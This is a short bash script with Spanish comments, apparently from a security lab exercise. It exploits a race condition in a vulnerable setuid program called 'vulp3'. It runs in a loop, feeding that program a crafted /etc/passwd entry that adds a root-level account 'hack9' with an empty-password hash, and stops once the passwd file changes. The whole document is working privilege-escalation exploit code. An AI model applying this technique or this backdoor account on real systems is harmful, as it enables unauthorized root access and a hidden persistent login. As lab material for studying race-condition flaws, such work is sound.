#!/bin/bash

CHECKFILE="ls -l /etc/passwd"

old=$($CHECKFILE)
new=$($CHECKFILE)

while [ "$old" = "$new" ]
do
   #En esta linea se escribe el usuario y su contraseña en hash
   #"U6aMy0wojraho" es una contraseña vacía
   #Se le dan permisos de root 
   #Y es el input a ingresar cuando al ejecutar vulp se solicite  
   echo "hack9:U6aMy0wojraho:0:0:hack9:/root:/bin/bash" | sudo ./vulp3
    new=$($CHECKFILE)
    sudo ls -la /tmp/XYZ
done
echo "El archivo passwd ha cambiado"
